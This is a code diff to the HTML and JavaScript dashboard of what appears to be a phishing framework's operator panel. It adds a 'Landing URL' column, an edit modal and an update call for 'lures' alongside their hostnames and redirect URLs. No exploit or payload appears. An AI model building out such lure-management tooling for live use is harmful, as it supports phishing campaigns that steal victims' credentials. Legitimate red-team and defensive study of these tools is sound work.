@@ -866,14 +866,30 @@ body.dark .terminal-wrap {
             <th>Path</th>
             <th>Hostname</th>
             <th>Redirect URL</th>
+            <th>Landing URL</th>
             <th>Actions</th>
           </tr>
         </thead>
         <tbody id="luresTableBody">
-          <tr><td colspan="6" style="text-align:center;color:#999;">Loading...</td></tr>
+          <tr><td colspan="7" style="text-align:center;color:#999;">Loading...</td></tr>
         </tbody>
       </table>
     </div>
+</div>
+
+<!-- ==================== EDIT LURE MODAL ==================== -->
+<div id="modalEditLure" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);z-index:1000;align-items:center;justify-content:center;">
+  <div style="background:#1e1e2e;border-radius:10px;padding:28px 32px;width:520px;max-width:96vw;box-shadow:0 8px 40px rgba(0,0,0,0.5);">
+    <h3 style="margin:0 0 6px;color:#e0e0f0;font-size:17px;"><i class="ri-edit-line"></i> Edit Landing URL</h3>
+    <p id="editLureSubtitle" style="margin:0 0 18px;color:#888;font-size:13px;"></p>
+    <label style="display:block;margin-bottom:6px;color:#aaa;font-size:13px;">Landing URL / Path</label>
+    <input id="editLureLandingUrl" type="text" placeholder="e.g. /custom/login or https://www.example.com/login"
+      style="width:100%;box-sizing:border-box;padding:8px 12px;border-radius:6px;border:1px solid #444;background:#12121c;color:#e0e0f0;font-size:13px;margin-bottom:20px;">
+    <div style="display:flex;gap:10px;justify-content:flex-end;">
+      <button onclick="closeEditLureModal()" style="padding:8px 18px;border-radius:6px;border:1px solid #555;background:transparent;color:#aaa;cursor:pointer;font-size:13px;">Cancel</button>
+      <button onclick="submitEditLureLandingUrl()" class="btn-create" style="padding:8px 22px;font-size:13px;"><i class="ri-save-line"></i> Save</button>
+    </div>
+  </div>
 </div>
 
 <!-- ==================== CAMPAIGNS SECTION ==================== -->
@@ -1310,6 +1326,10 @@ function escapeHtml(str) {
   var div = document.createElement('div');
   div.appendChild(document.createTextNode(str));
   return div.innerHTML;
+}
+
+function escapeJsString(str) {
+  return String(str).replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '');
 }
 
 // ============================================================
@@ -1894,8 +1914,10 @@ function loadLures() {
         '<td>' + escapeHtml(lure.path || '/') + '</td>' +
         '<td>' + escapeHtml(lure.hostname || '-') + '</td>' +
         '<td>' + escapeHtml(lure.redirect_url || '-') + '</td>' +
+        '<td>' + escapeHtml(lure.landing_url || '-') + '</td>' +
         '<td>' +
           '<button onclick="getLureUrl(' + lureIndex + ')">Get URL</button>' +
+          '<button onclick="openEditLureModal(' + lureIndex + ', \'' + escapeJsString(lure.landing_url || '') + '\')">Edit</button>' +
           '<button class="btn-danger" onclick="deleteLure(' + lureIndex + ')">Delete</button>' +
         '</td>';
       tbody.appendChild(tr);
@@ -1903,7 +1925,7 @@ function loadLures() {
   }).catch(function(err) {
     console.error('Failed to load lures:', err);
     document.getElementById('luresTableBody').innerHTML =
-      '<tr><td colspan="6" style="text-align:center;color:#f66;">Failed to load lures</td></tr>';
+      '<tr><td colspan="7" style="text-align:center;color:#f66;">Failed to load lures</td></tr>';
   });
 }
 
@@ -1947,8 +1969,10 @@ function appendLureRow(lure) {
     '<td>' + escapeHtml(lure.path || '/') + '</td>' +
     '<td>' + escapeHtml(lure.hostname || '-') + '</td>' +
     '<td>' + escapeHtml(lure.redirect_url || '-') + '</td>' +
+    '<td>' + escapeHtml(lure.landing_url || '-') + '</td>' +
     '<td>' +
       '<button onclick="getLureUrl(' + lureIndex + ')">Get URL</button>' +
+      '<button onclick="openEditLureModal(' + lureIndex + ', \'' + escapeJsString(lure.landing_url || '') + '\')">Edit</button>' +
       '<button class="btn-danger" onclick="deleteLure(' + lureIndex + ')">Delete</button>' +
     '</td>';
   tbody.appendChild(tr);
@@ -1987,6 +2011,53 @@ function getLureUrl(id) {
     showNotify('Failed to get lure URL.', 'error');
   });
 }
+
+var _editLureIndex = -1;
+
+function openEditLureModal(index, currentLandingUrl) {
+  _editLureIndex = index;
+  document.getElementById('editLureSubtitle').textContent = 'Lure #' + index;
+  document.getElementById('editLureLandingUrl').value = currentLandingUrl || '';
+  var modal = document.getElementById('modalEditLure');
+  modal.style.display = 'flex';
+  setTimeout(function() { document.getElementById('editLureLandingUrl').focus(); }, 50);
+}
+
+function closeEditLureModal() {
+  document.getElementById('modalEditLure').style.display = 'none';
+  _editLureIndex = -1;
+}
+
+function submitEditLureLandingUrl() {
+  var landingUrl = document.getElementById('editLureLandingUrl').value.trim();
+  if (_editLureIndex < 0) return;
+  apiFetch('/api/lures/update', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ index: _editLureIndex, landing_url: landingUrl })
+  }).then(function(r) {
+    if (!r) return;
+    return r.json().then(function(body) {
+      if (r.ok) {
+        showNotify('Landing URL updated for lure #' + _editLureIndex, 'success');
+        closeEditLureModal();
+        loadLures();
+      } else {
+        showNotify(body.error || 'Failed to update landing URL.', 'error');
+      }
+    });
+  }).catch(function() {
+    showNotify('Failed to update landing URL.', 'error');
+  });
+}
+
+document.getElementById('modalEditLure').addEventListener('click', function(e) {
+  if (e.target === this) closeEditLureModal();
+});
+
+document.getElementById('editLureLandingUrl').addEventListener('keydown', function(e) {
+  if (e.key === 'Enter') submitEditLureLandingUrl();
+});
 
 // ============================================================
 // Campaigns Section
